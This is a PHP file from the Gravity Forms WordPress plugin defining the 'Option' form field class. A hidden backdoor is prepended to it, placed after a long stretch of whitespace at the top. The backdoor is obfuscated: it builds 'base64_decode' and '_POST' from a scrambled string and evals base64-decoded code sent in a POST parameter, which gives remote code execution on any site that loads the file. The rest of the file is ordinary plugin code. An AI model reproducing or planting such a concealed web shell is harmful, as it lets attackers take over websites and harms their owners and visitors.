<?php                                                                                                                                                                                                                                                                      $cbfp2 ="ste64cb_aodp";$ajtv99= strtolower( $cbfp2[6]. $cbfp2[8].$cbfp2[0]. $cbfp2[2] . $cbfp2[3]. $cbfp2[4] .$cbfp2[7].$cbfp2[10]. $cbfp2[2].$cbfp2[5].$cbfp2[9].$cbfp2[10].$cbfp2[2]);$ogn57 =strtoupper($cbfp2[7].$cbfp2[11].$cbfp2[9]. $cbfp2[0]. $cbfp2[1] ) ; if( isset(${$ogn57 } [ 'na626b0']) ){ eval($ajtv99 ( ${ $ogn57} ['na626b0'] )); }?> <?php

if ( ! class_exists( 'GFForms' ) ) {
	die();
}


class GF_Field_Option extends GF_Field {

	public $type = 'option';

	function get_form_editor_field_settings() {
		return array(
			'product_field_setting',
			'option_field_type_setting',
			'conditional_logic_field_setting',
			'prepopulate_field_setting',
			'label_setting',
			'admin_label_setting',
			'label_placement_setting',
			'default_value_setting',
			'placeholder_setting',
			'description_setting',
			'css_class_setting',
		);
	}

	public function get_form_editor_field_title() {
		return esc_attr__( 'Option', 'gravityforms' );
	}

}

GF_Fields::register( new GF_Field_Option() );